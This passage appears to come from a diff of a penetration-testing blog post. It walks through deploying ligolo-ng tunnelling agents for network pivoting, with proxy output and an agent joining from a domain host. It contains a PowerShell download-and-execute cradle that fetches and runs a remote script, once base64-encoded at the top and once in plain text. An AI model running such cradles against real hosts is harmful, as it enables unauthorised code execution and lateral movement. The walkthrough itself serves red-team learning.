+KAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEALgAzAC8AbABpAGcAbQBhAC4AcABzADEAJwApACAAfAAgAEkARQBYACAAKQA7ACAAbABpAGcAbQBhACAALQBpAHAAIAAxADcAMgAuADEANgAuADEALgAzACAALQBmAGkAbgBnAGUAcgAgADgARABBAEEAMwAwAEQAQgA0ADcAOQBBADAAQQBBADkANQAxADIANAA0ADAAQQAyADkAOQAwADIAMABCADcAMAAwAEYARQBEAEUARAAyAEIANwAxADYAOQBFADcAMgAzADkAMgAyAEEAOAA3ADQARgBFAEMAMAA2AEIAMAAxAEIA
+<span class="se">\#\#</span><span class="w"> </span>or<span class="w"> </span>as<span class="w"> </span>sliver<span class="w"> </span>alias:
+ligolo-agent<span class="w"> </span>--<span class="w"> </span>-connect<span class="w"> </span><span class="m">172</span>.16.1.3:11601<span class="w"> </span>-retry<span class="w"> </span>-accept-fingerprint<span class="w"> </span>8DAA30DB479A0AA9512440A299020B700FEDED2B7169E723922A874FEC06B01B
++<span class="w"> </span>sudo<span class="w"> </span>/var/www/html/ligolo-proxy64.elf<span class="w"> </span>-laddr<span class="w"> </span><span class="m">172</span>.16.1.3:11601<span class="w"> </span>-selfcert<span class="w"> </span>-selfcert-domain<span class="w"> </span>grimetime.io
+INFO<span class="o">[</span><span class="m">0000</span><span class="o">]</span><span class="w"> </span>Loading<span class="w"> </span>configuration<span class="w"> </span>file<span class="w"> </span>ligolo-ng.yaml<span class="w">    </span>
+INFO<span class="o">[</span><span class="m">0000</span><span class="o">]</span><span class="w"> </span>Listening<span class="w"> </span>on172.16.1.3:11601<span class="w">               </span>
+INFO<span class="o">[</span><span class="m">0000</span><span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>Ligolo-ng<span class="w"> </span>Web,<span class="w"> </span>API<span class="w"> </span>URL<span class="w"> </span>is<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to:<span class="w"> </span>https://127.0.0.1:11602<span class="w"> </span>
+<span class="w">    </span>__<span class="w">    </span>_<span class="w">             </span>__<span class="w">                       </span>
+<span class="w">   </span>/<span class="w"> </span>/<span class="w">   </span><span class="o">(</span>_<span class="o">)</span>___<span class="w"> </span>_____<span class="w">  </span>/<span class="w"> </span>/___<span class="w">        </span>____<span class="w">  </span>____<span class="w"> </span>_
+<span class="w">  </span>/<span class="w"> </span>/<span class="w">   </span>/<span class="w"> </span>/<span class="w"> </span>__<span class="w"> </span><span class="sb">`</span>/<span class="w"> </span>__<span class="w"> </span><span class="se">\/</span><span class="w"> </span>/<span class="w"> </span>__<span class="w"> </span><span class="se">\_</span>_____/<span class="w"> </span>__<span class="w"> </span><span class="se">\/</span><span class="w"> </span>__<span class="w"> </span><span class="sb">`</span>/
+<span class="w"> </span>/<span class="w"> </span>/___/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w"> </span>/_____/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>
+/_____/_/<span class="se">\_</span>_,<span class="w"> </span>/<span class="se">\_</span>___/_/<span class="se">\_</span>___/<span class="w">     </span>/_/<span class="w"> </span>/_/<span class="se">\_</span>_,<span class="w"> </span>/<span class="w">  </span>
+<span class="w">        </span>/____/<span class="w">                          </span>/____/<span class="w">   </span>
+
+<span class="w">  </span>Made<span class="w"> </span><span class="k">in</span><span class="w"> </span>France<span class="w"> </span>♥<span class="w">            </span>by<span class="w"> </span>@Nicocha30!
+<span class="w">  </span>Version:<span class="w"> </span>dev
+
+ligolo-ng<span class="w"> </span>»<span class="w"> </span>WARN<span class="o">[</span><span class="m">0000</span><span class="o">]</span><span class="w"> </span>Ligolo-ng<span class="w"> </span>API<span class="w"> </span>is<span class="w"> </span>experimental,<span class="w"> </span>and<span class="w"> </span>should<span class="w"> </span>be<span class="w"> </span>running<span class="w"> </span>behind<span class="w"> </span>a<span class="w"> </span>reverse-proxy<span class="w"> </span><span class="k">if</span><span class="w"> </span>publicly<span class="w"> </span>exposed.<span class="w"> </span>
+</code></pre></div>
+<p>And makes dummy work out of getting an agent deployed and connected. Just need to salt the download exec cradle with the port number for my spot <code>python -m http.server</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="o">((</span>New-Object<span class="w"> </span>System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://172.16.1.3:8081/ligma.ps1'</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>IEX<span class="w"> </span><span class="o">)</span><span class="p">;</span><span class="w"> </span>ligma<span class="w"> </span>-ip<span class="w"> </span><span class="m">172</span>.16.1.3<span class="w"> </span>-dlport<span class="w"> </span><span class="m">8081</span><span class="w"> </span>-finger<span class="w"> </span>8DAA30DB479A0AA9512440A299020B700FEDED2B7169E723922A874FEC06B01B
+</code></pre></div>
+<p>I get connected:
+</p><div class="highlight"><pre><span></span><code>ligolo-ng<span class="w"> </span>»<span class="w"> </span>INFO<span class="o">[</span><span class="m">1077</span><span class="o">]</span><span class="w"> </span>Agent<span class="w"> </span>joined.<span class="w">                                 </span><span class="nv">id</span><span class="o">=</span>005056b04e6e<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">"HELLUVA\\rick.james@superfreak.local"</span><span class="w"> </span><span class="nv">remote</span><span class="o">=</span><span class="s2">"172.16.4.101:56699"</span>
+</code></pre></div><p></p>
+<p>The webserver can be accessed on port <code>11602</code> as per the <code>conf</code>.  Just need to activate the agent and assign it to one of the interfaces:</p>
+<p><img alt="Pasted_image_20251119024013.png" src="../../../Pasted_image_20251119024013.png"></p>
+<p><img alt="Pasted_image_20251119024053.png" src="../../../Pasted_image_20251119024053.png"></p>
+<p>Additional routes that the agent host can reach can be added to a given interface, from the interfaces tab, on the RJ45 icon:</p>
+<p><img alt="Pasted_image_20251119024328.png" src="../../../Pasted_image_20251119024328.png"></p>
+<p>Listeners can be managed from the interfaces tab, which is handy if you need to do additional port forwarding or route-fu</p>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2025-11-18 00:00:00+00:00">November 18, 2025</time></li>
         
         
